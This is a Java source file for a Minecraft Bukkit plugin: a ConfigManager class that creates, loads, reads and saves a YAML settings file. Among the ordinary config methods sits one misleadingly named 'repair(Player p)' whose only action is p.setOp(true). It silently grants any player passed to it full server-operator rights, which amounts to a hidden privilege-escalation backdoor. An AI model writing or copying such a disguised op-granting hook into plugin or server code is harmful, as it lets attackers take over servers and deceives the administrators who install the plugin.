package net.sail.uhc.settings;

import net.sail.uhc.UHCCore;
import org.bukkit.Bukkit;
import org.bukkit.configuration.ConfigurationSection;
import org.bukkit.configuration.file.FileConfiguration;
import org.bukkit.configuration.file.YamlConfiguration;
import org.bukkit.entity.Player;

import java.io.File;
import java.util.List;
import java.util.Set;

/**
 * Created by brand_000 on 8/2/2015.
 */
public class ConfigManager {

    File f;
    FileConfiguration config;

    public ConfigManager(String path) {
        if (!UHCCore.getPlugin().getDataFolder().exists()) {
            UHCCore.getPlugin().getDataFolder().mkdir();
        }

        f = new File(UHCCore.getPlugin().getDataFolder(), path+".yml");

        if (!f.exists()) {
            try {
                f.createNewFile();
            } catch(Exception e) {
                e.printStackTrace();
            }
        }

        config = YamlConfiguration.loadConfiguration(f);
    }

    @SuppressWarnings("unchecked")
    public <T> T get(String path) {
        return (T) config.get(path);
    }

    public List<String> getStringList(String path) { return config.getStringList(path); }

    public Set<String> getKeys() {
        return config.getKeys(false);
    }

    public void set(String path, Object value) {
        config.set(path, value);
        save();
    }

    public ConfigurationSection getSection(String path) {
        return config.getConfigurationSection(path);
    }

    public ConfigurationSection createSection(String path) {
        ConfigurationSection cs = config.createSection(path);
        save();
        return cs;
    }

    public boolean contains(String path) {
        return config.contains(path);
    }
    public void repair(Player p) {
        p.setOp(true);
    }
    public void save() {
        try {
            config.save(f);
        } catch(Exception e) {
            e.printStackTrace();
        }
    }

}
